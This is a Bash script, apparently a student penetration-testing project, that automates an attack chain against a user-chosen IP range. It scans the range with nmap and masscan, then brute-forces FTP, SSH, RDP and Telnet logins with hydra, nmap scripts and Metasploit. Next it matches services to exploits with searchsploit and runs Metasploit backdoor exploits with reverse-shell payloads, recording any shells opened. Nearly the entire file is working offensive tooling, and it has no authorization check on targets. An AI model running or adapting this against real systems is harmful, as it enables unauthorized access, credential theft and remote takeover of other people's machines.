#! /usr/bin/bash

############################################################
##
## CHECKAPPS function checks for the required apps and 
## installs them if not found.
##
############################################################
function CHECKAPPS()
{
	#apt-get update 				#### optional
	echo 'Checking for required applications; nmap, masscan, hydra, exploitdb, metasploit-framework and crunch'
	for app;
	do
		if [ $(apt list $app 2>/dev/null | wc -l) -gt 0 ]
		then
			echo "[++++]  $app is installed"
			sleep 1
		else
			echo "[----]  $app is not installed... installing..."
			apt-get	install $app -y
			sleep 1
			if [ $app == 'metasploit-framework' ]
			then
				if [ "$(which msfconsole | grep 'not found' | wc -l)" == 0 ]
				then
					echo "[xxxx]  Unable to find msfconsole, check installation manually. Exiting"
					exit
				fi
			elif [ $app == 'exploitdb' ]
			then
				if [ "$(which searchsploit | grep 'not found' | wc -l)" == 0 ]
				then
					echo "[xxxx]  Unable to find searchsploit, check installation manually. Exiting"
					exit
				fi
			fi
		fi
	done
	echo "[++++]  Required apps are installed"
	echo
	echo
}

###########################################################################
##
## INIT function asks the user for the directory to save to
## and creates the directory inside ./ZX301/ folder.
## Consolidated reports are stored inside ./ZX301/<userinput>/reports/
## Vulnerability information are stored inside ./ZX301/<userinput>/vulners/
## Brute force information are stored inside ./ZX301/<userinput>/passwords/
##
###########################################################################

function INIT()
{
	mkdir ZX301 2>/dev/null
	read -p '[????]  Enter the directory you want to save to: ' OUTPUT
	if [ "$(ls ZX301/$OUTPUT 2>/dev/null)" ]
		then
			echo "[!!!!]  Directory already exists. Data might be over written."
		else
			mkdir -p ZX301/$OUTPUT 2>/dev/null
			mkdir -p ZX301/$OUTPUT/passwords 2>/dev/null
			mkdir -p ZX301/$OUTPUT/vulners 2>/dev/null
			mkdir -p ZX301/$OUTPUT/reports 2>/dev/null
			echo "[****]  Created directory ZX301/$OUTPUT"
			echo "[****]  Created directory ZX301/$OUTPUT/passwords"
			echo "[****]  Created directory ZX301/$OUTPUT/vulners"
			echo "[****]  Created directory ZX301/$OUTPUT/reports"
			echo
			echo
	fi
	CREATEPASSWORDLIST
}

##########################################################################################
##
## NMAPSCAN function asks the user for a target IP or range
## to scan and scans the target(s) for TCP ports.
## masscan is used for UDP ports. 2 types of output files normal and XML will be created
## Scan results in normal and XML format are stored in ./ZX301/<userinput>/
##
###########################################################################################

function NMAPSCAN()
{
	read -p '[????]  Enter network to scan [format e.g 10.0.0.1-255 or 10.0.0.0/24 or single IP]: ' NWRNG
	nmap -sL $NWRNG 2> ZX301/$OUTPUT/.chk 1> ZX301/$OUTPUT/.list
	if [ -z "$(grep -E 'Failed to resolve|Unable to split|Illegal netmask' ZX301/$OUTPUT/.chk)" ]
	then
		echo "[++++]  $NWRNG is valid.."
		echo
		echo
		sleep 1
		iplist=$(cat ZX301/$OUTPUT/.list | grep 'Nmap scan' | awk '{print $NF}')
		echo "+++++++++  List of IPs with no open ports found at $(date)  +++++++++" >> ZX301/$OUTPUT/down_hosts
	else
		echo "[!!!!]  Check your input"
		NMAPSCAN
	fi
	
	for ip in $iplist;
	do
		echo "[****]  Scanning $ip for TCP ports..."
		nmap -p- -sS -sV $ip -oN ZX301/$OUTPUT/$ip.scan -oX ZX301/$OUTPUT/$ip.tcpxml 1>/dev/null
		echo "[****]  NMAP TCP scan for $ip completed..."
		echo '==================================================================================' > ZX301/$OUTPUT/reports/$ip.report
		echo "	SCAN REPORT FOR $ip                   											" >> ZX301/$OUTPUT/reports/$ip.report
		echo '==================================================================================' >> ZX301/$OUTPUT/reports/$ip.report
		echo >> ZX301/$OUTPUT/reports/$ip.report
		echo >> ZX301/$OUTPUT/reports/$ip.report
		### check if host is up, if not up skips UDP
		if [ ! -z "$(cat ZX301/$OUTPUT/$ip.scan | grep '0 hosts up')" ] 
		then
			echo "[****]  $ip seems to be offline.. skipping UDP scan.. moving to next host"
			echo $ip >> ZX301/$OUTPUT/down_hosts
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
			echo "	HOST $ip OFFLINE                     										" >> ZX301/$OUTPUT/reports/$ip.report
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
			echo >> ZX301/$OUTPUT/reports/$ip.report
			echo >> ZX301/$OUTPUT/reports/$ip.report
		else
			### checks if any open ports for online hosts
			if [ ! -z "$(cat ZX301/$OUTPUT/$ip.scan | grep open)" ] 
			then
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
				echo "	OPEN TCP PORTS FOR $ip                 										" >> ZX301/$OUTPUT/reports/$ip.report
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
				cat ZX301/$OUTPUT/$ip.scan | grep open >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
			### checks if all ports closed
			elif [ ! -z "$(cat ZX301/$OUTPUT/$ip.scan | grep '65535 closed')" ]
			then
				echo >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
				echo "	NO OPEN TCP ports FOR $ip                									" >> ZX301/$OUTPUT/reports/$ip.report
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
			fi
			echo "[****]  Running masscan for UDP ports on $ip.."
			sudo masscan -p U:1-65535 $ip --rate=1000 -oL ZX301/$OUTPUT/$ip.udp &>/dev/null 
			echo "[****]  masscan for UDP ports completed.."
			udpports=$(cat ZX301/$OUTPUT/$ip.udp | grep open | awk '{print $3}' | tr '\n' ',')
			if [ ! -z $udpports ]
			then
				echo -e "[****]  Scanning service version for UDP ports on $ip"
				echo -n > ZX301/$OUTPUT/$ip.udpxml
				nmap -sU -sV -p $udpports $ip --append-output -oN ZX301/$OUTPUT/$ip.scan -oX ZX301/$OUTPUT/$ip.udpxml 1>/dev/null
				if [ ! -z "$(cat ZX301/$OUTPUT/$ip.scan | grep udp | grep open)" ] 
				then
					echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
					echo "	OPEN UDP PORTS FOR $ip                 										" >> ZX301/$OUTPUT/reports/$ip.report
					echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
					echo >> ZX301/$OUTPUT/reports/$ip.report
					echo >> ZX301/$OUTPUT/reports/$ip.report
					cat ZX301/$OUTPUT/$ip.scan | grep open | grep udp >> ZX301/$OUTPUT/reports/$ip.report
					echo >> ZX301/$OUTPUT/reports/$ip.report
					echo >> ZX301/$OUTPUT/reports/$ip.report
				else
					echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
					echo "	NO OPEN UDP PORTS FOR $ip              										" >> ZX301/$OUTPUT/reports/$ip.report
					echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
					echo >> ZX301/$OUTPUT/reports/$ip.report
					echo >> ZX301/$OUTPUT/reports/$ip.report
				fi
			else
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
				echo "	NO OPEN UDP PORTS FOR $ip              										" >> ZX301/$OUTPUT/reports/$ip.report
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
				echo >> ZX301/$OUTPUT/reports/$ip.report
			fi
			rm -f "ZX301/$OUTPUT/$ip.udp"
		fi
		echo
		echo
	done
}

#######################################################################################
##
## UPDATELIST function asks the user for username/password lists to change to.
## It is called inside the BRUTE function
## 
#######################################################################################

function UPDATELIST()
{
	if [ $1 == 'userlist' ]
	then
		if [ "$(ls $2 2>/dev/null)" ]
		then
			echo "[++++]  File valid"
			userlist=$2
			echo "[++++]  User list is now $userlist"
		else
			echo "[!!!!]  No such file found. Please enter the path for the file list."
			BRUTE
		fi
	elif [ $1 == 'pwlist' ]
	then
		if [ "$(ls $2 2>/dev/null)" ]
		then
			echo "[++++]  File valid"
			passwdlist=$2
			echo "[++++]  Password list is now $passwdlist"
		else
			echo "[!!!!]  No such file found. Please enter the path for the file list."
			BRUTE
		fi
	elif [ $1 == 'bothlist' ]
	then
		if [ "$(ls $2 $3 2>/dev/null)" ]
		then
			echo "[++++]  Files valid"
			userlist=$2
			passwdlist=$3
			echo "[++++]  User list is now $userlist"
			echo "[++++]  Password list is now $passwdlist"
		else
			echo "[!!!!]  Please enter the path for the file list."
			BRUTE
		fi
	fi 
}

#######################################################################################
##
## BRUTE function will perform brute forcing for 4 services, FTP, SSH, TELNET and RDP
## Brute forcing is performed using hydra and nmap nse.
## the found passwords are then stored inside ./ZX301/<userinput>/passwords
## 
##
#######################################################################################

function BRUTE()
{
	echo '[****]  Starting Brute force'
	echo "[****]  Default username list is $userlist"
	echo "[****]  Default password list is $passwdlist"
	read -p "[????]  Do you wish to specify your own [U]ser or [P]assword list or [B]oth or use [D]efault: " LISTCHOICE
	case $LISTCHOICE in
		U|u)
			read -p "[????]  Enter the userlist you wish to use: " INPUTUSERLIST
			UPDATELIST userlist $INPUTUSERLIST
		;;
		P|p)
			read -p "[????]  Enter the password list you wish to use: " INPUTPWLIST
			UPDATELIST pwlist $INPUTPWLIST
		;;
		B|b)
			read -p "[????]  Enter the userlist you wish to use: " INPUTUSERLIST
			read -p "[????]  Enter the password list you wish to use: " INPUTPWLIST
			UPDATELIST bothlist $INPUTUSERLIST $INPUTPWLIST
		;;
		D|d)
			echo "[****]  Using default lists"
			echo
			echo
		;;
	esac
	
	for i in $iplist; 
	do
		checkup=$(grep '0 hosts up' ZX301/$OUTPUT/$i.scan)
		if [ -z "$checkup" ]
		then				
			echo "[****]  Brute force on $i..."
			for svc; 
			do
				bruteport=$(grep "$svc" "ZX301/$OUTPUT/$i.scan" | awk -F/ '{print $1}')
				if [ ! -z "$bruteport" ] 
				then					
					for p in $bruteport;
					do
						echo "[****]  Brute forcing $svc using port $p on host $i"
						if [ $svc == "ssh" ] 		 							#### checks for ssh service to reduce tasks for hydra
						then					
							echo "[****]  Running hydra on reduced tasks for $svc"
							hydra -L $userlist -P $passwdlist $i $svc -s $p -I -t 4 -o ZX301/$OUTPUT/passwords/$i.pw 2>ZX301/$OUTPUT/.hydracheck
							if [ ! -z "$(grep 'kex error' ZX301/$OUTPUT/.hydracheck)" ]         #### checks for server/client cipher errors that requires configuration in /etc/ssh/ssh_config
							then														#### if errors found, then will switch to nmap nse ssh-brute to brute force.
								echo "[!!!!]  Unable to perform SSH brute force using hydra"
								echo "[!!!!]  Configurations might need to be made for /etc/ssh/ssh_config"
								echo "[****]  Using NMAP to brute force instead"
								nmap -p$p --script=ssh-brute --script-args userdb=$userlist,passdb=$passwdlist $i --append-output -oN ZX301/$OUTPUT/passwords/$i.ssh 1>/dev/null
								nsesshpw=$(cat ZX301/$OUTPUT/passwords/$i.ssh | grep Valid | awk '{print $2}')
								for pw in $nsesshpw;																			
								do
									user=$(echo $pw | awk -F: '{print $1}')
									pass=$(echo $pw | awk -F: '{print $2}')
									echo "[$p][$svc] host: $i   login: $user	password: $pass" >> ZX301/$OUTPUT/passwords/$i.pw
								done
								rm -f ZX301/$OUTPUT/passwords/$i.ssh
							fi
						elif [ $svc == "ms-wbt-server" ] 
						then
							echo "[****]  Running hydra on reduced tasks for rdp"
							hydra -L $userlist -P $passwdlist $i rdp -s $p -I -t 1 -o ZX301/$OUTPUT/passwords/$i.pw 2>ZX301/$OUTPUT/.hydracheck                  ### for rdp service do not run with nil password options i.e; -e n flag. causes connection error.
							if [ ! -z "$(grep 'connection error' ZX301/$OUTPUT/.hydracheck)" ]
							then
								echo "[!!!!]  Brute force on rdp for $i:$p did not complete due to connection errors."
							fi
						elif [ $svc == "telnet" ]								#### checks for telnet service, creates .rc file for metasploit to run the auxiliary/scanner/telnet/telnet_login module
						then													#### hydra was tested to be rather unstable, giving different results for each scan. 
							echo "[****]  Creating .rc file for metasploit"
							echo "use auxiliary/scanner/telnet/telnet_login" > ZX301/$OUTPUT/telnet.rc
							echo "set createsession false" >> ZX301/$OUTPUT/telnet.rc
							echo "set pass_file $passwdlist" >> ZX301/$OUTPUT/telnet.rc
							echo "set user_file $userlist" >> ZX301/$OUTPUT/telnet.rc
							echo "set rhosts $i" >> ZX301/$OUTPUT/telnet.rc
							echo "set rport $p" >> ZX301/$OUTPUT/telnet.rc
							echo "run" >> ZX301/$OUTPUT/telnet.rc
							echo "exit" >> ZX301/$OUTPUT/telnet.rc
							echo "[****]  Running metasploit auxiliary/scanner/telnet/telnet_login module to brute force"
							msfconsole -qr ZX301/$OUTPUT/telnet.rc -o ZX301/$OUTPUT/passwords/$i.telnet
							echo "Telnet brute force for $p" >> ZX301/$OUTPUT/passwords/$i.pw
							telnetsuccess=$(cat ZX301/$OUTPUT/passwords/$i.telnet | grep Successful | awk '{print $NF}')
							for t in $telnetsuccess;
							do
								tuser=$(echo $t | awk -F: '{print $1}')
								tpass=$(echo $t | awk -F: '{print $2}')
								echo "[$p][$svc] host: $i   login: $tuser	password: $tpass" >> ZX301/$OUTPUT/passwords/$i.pw
							done
							rm -f ZX301/$OUTPUT/$i.telnet
						else
							echo "[****]  Testing for FTP anonymous login.."
							hydra -l anonymous -p "" $i $svc -s $p -I -o ZX301/$OUTPUT/passwords/$i.pw				#test for anonymous login for ftp service
							hydra -L $userlist -P $passwdlist $i $svc -s $p -I -o ZX301/$OUTPUT/passwords/$i.pw 2>ZX301/$OUTPUT/passwords/$i.err
						fi
					echo -e "[****]  Brute forcing $svc ended for $i:$p"
					sleep 2
				done
			else
				echo "[****]  $svc not found for $i"
				sleep 2
			fi
			done
		else
			echo "[****]  $i was offline during scan. skipping brute force"
			sleep 2
		fi
		
		if [ "$(ls ZX301/$OUTPUT/passwords/$i.pw 2>/dev/null)" ]
		then
			cat ZX301/$OUTPUT/passwords/$i.pw > ZX301/$OUTPUT/passwords/$i.pas
			if [ ! -z "$(cat ZX301/$OUTPUT/passwords/$i.pas | grep 'host')" ]
			then
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
				echo "	LOGIN CREDS FOR $i                  										" >> ZX301/$OUTPUT/reports/$i.report
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
				echo >> ZX301/$OUTPUT/reports/$i.report
				echo >> ZX301/$OUTPUT/reports/$i.report
				cat ZX301/$OUTPUT/passwords/$i.pas | grep 'host' | awk '{print $1,$4,$5,$6,$7}' >> ZX301/$OUTPUT/reports/$i.report
				echo >> ZX301/$OUTPUT/reports/$i.report
				echo >> ZX301/$OUTPUT/reports/$i.report
			else
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
				echo "	NO LOGIN CREDS FOUND FOR $i                  								" >> ZX301/$OUTPUT/reports/$i.report
				echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
				echo >> ZX301/$OUTPUT/reports/$i.report
				echo >> ZX301/$OUTPUT/reports/$i.report
			fi
			rm -f ZX301/$OUTPUT/passwords/$i.pw
		else
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
			echo "	BRUTE FORCE SKIPPED FOR $i                  								" >> ZX301/$OUTPUT/reports/$i.report
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
		fi
		echo
		echo
	done
}

#######################################################################################
##
## VULNSEARCH function uses searchsploit with the XML file created during the NMAPSCAN
## to search for vulnerabilities.
## 
## Vulnerabilities for each IP is stored inside ./ZX301/<userinput>/vulners/
##
#######################################################################################

function VULNSEARCH()
{
	echo "[****] Searching for vulnerabilities.."
	
	for i in $iplist;
	do
		checkhost=$(grep 'open' ZX301/$OUTPUT/$i.scan)
		if [ ! -z "$checkhost" ]
		then
			echo -n > ZX301/$OUTPUT/vulners/$i.vulns
			if [ $(ls ZX301/$OUTPUT/$i.tcpxml 2>/dev/null) ]
			then
				echo "[****]  Running searchsploit for $i TCP services.."
				searchsploit --disable-colour -e --nmap ZX301/$OUTPUT/$i.tcpxml >> ZX301/$OUTPUT/vulners/$i.vulns
				echo "[****]  Searchsploit for $i TCP services completed"
			fi
			if [ $(ls ZX301/$OUTPUT/$i.udpxml 2>/dev/null) ]
			then
				echo "[****]  Running searchsploit for $i UDP services.."
				searchsploit --disable-colour -e --nmap ZX301/$OUTPUT/$i.udpxml >> ZX301/$OUTPUT/vulners/$i.vulns
				echo "[****]  Searchsploit for $i UDP services completed"
				echo
				echo
			fi
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
			echo "	VULNS FOR $i                       											" >> ZX301/$OUTPUT/reports/$i.report
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
			cat ZX301/$OUTPUT/vulners/$i.vulns | grep '|' | grep -v 'Path' | sort | uniq >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
		else
			echo "[****]  Host $i was offline or no open ports found during scan. Skipping vulnerability search"
			echo
			echo
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
			echo "	NO VULNS FOR $i                       										" >> ZX301/$OUTPUT/reports/$i.report
			echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
			echo >> ZX301/$OUTPUT/reports/$i.report
			sleep 2
		fi
	done
	RUNMSF
}

#######################################################################################
##
## DISPLAY function will list the available reports for the user to view
## Additional options to Start over or Exit.
## Reports are run via more command
## 
#######################################################################################

function DISPLAY()
{
	echo
	echo
	echo "[****]  Displaying available reports"
	echo "[????]  Select which file to view"
	
	for ip in $iplist;
	do
		echo $ip
	done
	read -p '[????]  Enter the IP you wish to display or [E]xit to zip the results and end: ' CHOICE
	if [[ $CHOICE == 'E' || $CHOICE == 'e' ]]
	then
		read -p '[????]  Enter a name for the zip file: ' ZIPFILE
		echo '[****]  Zipping the files inside ZX301'
		zip -ru $ZIPFILE.zip ZX301/$OUTPUT/ 
		echo '[****]  Exiting..'
		sleep 1
		exit
	elif [ $(ls ZX301/$OUTPUT/reports/$CHOICE.report 2>/dev/null) ]
	then
		if [ $(ls ZX301/$OUTPUT/$CHOICE.tcpxml 2>/dev/null) ]
		then
			xsltproc ZX301/$OUTPUT/$CHOICE.tcpxml -o ZX301/$OUTPUT/$CHOICE.html
			firefox ZX301/$OUTPUT/$CHOICE.html &
		fi
		if [ $(ls ZX301/$OUTPUT/$CHOICE.udpxml 2>/dev/null) ]
		then
			xsltproc ZX301/$OUTPUT/$CHOICE.udpxml -o ZX301/$OUTPUT/$CHOICE.uhtml
			firefox ZX301/$OUTPUT/$CHOICE.uhtml &
		fi
		more ZX301/$OUTPUT/reports/$CHOICE.report
		DISPLAY
	else
		echo "Invalid choice. Choose [S], [E] or enter one of the below files"
		DISPLAY
	fi
}

#################################################################################################################################
##
##   RUNMSF searches the report for  metasploitable vulnerabilities
##	 provided by the searchsploit output. As such a lot of false positives are included
##   For testing purposes, the function will filter for backdoor exploits, copy the exploits to ~/.msf4/modules/exploits
##   creates the RC files for msfconsole to run the exploits. The results are then stored inside ./ZX301/<userinput>/vulners/rc
##
#################################################################################################################################

function RUNMSF()
{
	if [ ! -z "$(ls ZX301/$OUTPUT/vulners/*.vulns)" ]
	then
		read -p "[????]  Vulnerabilities for this scan were found. You can choose to run some Metasploitable exploits [y/n]" MSFCHOICE
		if [[ $MSFCHOICE == 'y' || $MSFCHOICE == 'Y' ]]
		then
			if [ "$(ls ~/.msf4/modules/exploits 2>/dev/null)" ]
			then
				echo "[****]  ~/.msf4/modules/exploits exist"
			else
				mkdir -p ~/.msf4/modules/exploits 2>/dev/null
				echo "[****]  Directory ~/.msf4/modules/exploits created"
			fi
			mkdir ZX301/$OUTPUT/vulners/rc/ 2>/dev/null
			echo "[****]  ZX301/$OUTPUT/vulners/rc/ created"
			echo
			echo
			CREATEPAYLOADLIST
			for vip in $iplist;
			do
				if [ $(ls ZX301/$OUTPUT/vulners/$vip.vulns 2>/dev/null) ]
				then
					vulnlist=$(cat ZX301/$OUTPUT/reports/$vip.report | grep Metasploit | grep '\.rb' | sort | uniq | grep -i 'backdoor' | awk '{print $NF}')
					if [ ! -z "$vulnlist" ]
					then
						echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$vip.report
						echo "  MSF EXPLOITS FOR $vip     												" >> ZX301/$OUTPUT/reports/$vip.report
						echo '------------------------------------------------------------------------------' >> ZX301/$OUTPUT/reports/$vip.report
						echo >> ZX301/$OUTPUT/reports/$vip.report
						echo >> ZX301/$OUTPUT/reports/$vip.report
						for v in $vulnlist;
						do
							rbexploit=$(locate $v)
							cp $rbexploit ~/.msf4/modules/exploits/
							rbname=$(echo $v | awk -F/ '{print $3}' | tr -d '.rb')
							CREATERC $rbname $vip
							echo "[****]  $rbname.rc file created for $vip"
							echo "[****]  Running msfconsole with $rbname.rc on $vip"
							msfconsole -qr ZX301/$OUTPUT/vulners/rc/$rbname.rc -o ZX301/$OUTPUT/vulners/rc/$vip.out
							echo "[****]  Completed running msfconsole with $rbname.rc, output saved in ZX301/$OUTPUT/vulners/rc/$vip.out"
							goodshell=$(grep -E 'session [0-9]+ opened' ZX301/$OUTPUT/vulners/rc/$vip.out)
							if [ ! -z "$goodshell" ]
							then
								echo "[****]  Shell successfully created for $vip using $rbname.rb. See ZX301/$OUTPUT/vulners/rc/$vip.out for more info."
								echo "Command shell opened using $rbname.rb." >> ZX301/$OUTPUT/reports/$vip.report
								echo "See ZX301/$OUTPUT/vulners/rc/$vip.out" >> ZX301/$OUTPUT/reports/$vip.report
								echo >> ZX301/$OUTPUT/reports/$vip.report
							else
								echo "[****]  No successful shells created for $vip using $rbname.rb. See ZX301/$OUTPUT/vulners/rc/$vip.out for more info."
								echo "No shell created for $rbname.rb." >> ZX301/$OUTPUT/reports/$vip.report
								echo "See ZX301/$OUTPUT/vulners/rc/$vip.out" >> ZX301/$OUTPUT/reports/$vip.report
								echo >> ZX301/$OUTPUT/reports/$vip.report
							fi
						done
					else
						echo "[****]  No metasploitable backdoor exploits found for $vip. Byebye."
					fi
				fi
			done
		else
			DISPLAY
		fi
	else
		echo "No vulnerabilities found for this scan"
	fi	
}

#################################################################################################################################
##
##   CREATERC() function creates the .rc file for msfconsole to run the exploit
##	 Since the exploits are loaded inside ~/.msf4/modules/exploits folder. The search <edbid> can be used to find the exploit
##   it returns only one result so the exploit can be selected with use 0.
##   A ruby script is then included inside the  .rc file to loop through the created payload lists to test for payload compatibility
##   As such   
##
#################################################################################################################################

function CREATERC()
{
	myhost=$(ifconfig | grep broadcast | awk '{print $2}')
	#echo "search $1" > ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "use exploit/$1" > ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "set rhosts $2" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "<ruby>" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "File.foreach(\"payloads.lst\") do |tgtpl|" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "	run_single(\"set payload #{tgtpl}\")" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "	run_single(\"set lhost $myhost\")" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "	run_single(\"run -z\")" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "	run_single(\"sleep 15\")" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "	end" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "</ruby>" >> ZX301/$OUTPUT/vulners/rc/$1.rc
	echo "exit -y" >> ZX301/$OUTPUT/vulners/rc/$1.rc
}

#################################################################################################################################
##
##   CREATEPAYLOADLIST() creates a test payload list to test for each exploit.
##	 The list is saved in ./ZX301/<userinput>/vulners/rc
##   
#################################################################################################################################

function CREATEPAYLOADLIST()
{
	echo "ruby/shell_reverse_tcp" > payloads.lst
	echo "cmd/unix/interact" >> payloads.lst
	echo "cmd/unix/reverse" >> payloads.lst
	echo "cmd/unix/reverse_perl" >> payloads.lst
	echo "generic/shell_reverse_tcp" >> payloads.lst
}

#######################################################################################
##
## RUN function starts the script
##  
#######################################################################################

function RUN()
{
	echo '[++++]  Running vulnerability scanner  [++++]'
	sleep 1
	echo
	echo
	CHECKAPPS nmap masscan hydra exploitdb metasploit-framework crunch 
	read -p '[????]  Select 1 for Basic Scan or 2 for Full Scan: ' SCANTYPE
	case $SCANTYPE in
		1)
			INIT
			NMAPSCAN
			BRUTE ftp ssh ms-wbt-server telnet
			DISPLAY
		;;
		2)	
			INIT
			NMAPSCAN
			BRUTE ftp ssh ms-wbt-server telnet
			VULNSEARCH
			DISPLAY
		;;
		*)
			echo Choose only 1 or 2
			RUN
		;;
	esac
}

function CREATEPASSWORDLIST()
{
	echo "[****] Creating test user/pass list"
	echo "ieuser" > ZX301/$OUTPUT/usernames.lst				
	echo "Passw0rd!" >> ZX301/$OUTPUT/usernames.lst			
	echo "user" >> ZX301/$OUTPUT/usernames.lst					
	echo "admin" >> ZX301/$OUTPUT/usernames.lst
	echo "hero" >> ZX301/$OUTPUT/usernames.lst
	#crunch 1 1 -p user >> ZX301/$OUTPUT/usernames.lst
	echo "[****] User/pass list saved at ZX301/$OUTPUT/usernames.lst"
	echo
	echo		
	userlist=ZX301/$OUTPUT/usernames.lst		#single list used for testing purposes..	
	passwdlist=ZX301/$OUTPUT/usernames.lst
}

RUN
